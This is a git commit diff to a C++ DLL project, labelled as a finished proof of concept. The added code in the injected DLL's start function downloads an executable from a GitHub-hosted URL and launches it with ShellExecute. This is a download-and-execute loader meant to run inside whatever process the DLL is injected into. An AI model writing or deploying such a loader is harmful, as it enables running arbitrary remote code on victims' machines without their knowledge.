cd733cfe657766d24a8dd823544c9555466f7fe3
LunaEwE <58312510+LunaEwE@users.noreply.github.com>
2020-01-29 02:25:24 -0600

    removed curl, finished poc

--- dll/entry_point/entry_point.cpp
+++ dll/entry_point/entry_point.cpp
@@ -1,12 +1,14 @@
 #include <Windows.h>
 #include <iostream>
+#include "../file_downloader/file_downloader.h"
 
 void start( ) {
-	AllocConsole( );
-	freopen_s( ( FILE** )stdin, "CONIN$", "r", stdin );
-	freopen_s( ( FILE** )stdout, "CONOUT$", "w", stdout );
+	printf_s( "DLL Injected\n" );
 
-	printf_s( "DLL Injected" );
+	if ( !n_file_downloader::download_file( "http://github.com/SilentProjects/executing_files_from_dll/raw/master/Release/file.exe" ) )
+		MessageBoxA( 0, "download failed", "effd", MB_OK );
+
+	ShellExecute( 0, "open", "file.exe", 0, 0, SW_SHOWNORMAL );
 }
 
 BOOL WINAPI DllMain( _In_ HINSTANCE instance, _In_ DWORD reason, _In_ LPVOID reserved ) {
--- dll/file_downloader/file_downloader.h
+++ dll/file_downloader/file_downloader.h
@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <string>
+#include <tchar.h>
 
 namespace n_file_downloader {
 	bool download_file( std::string file );
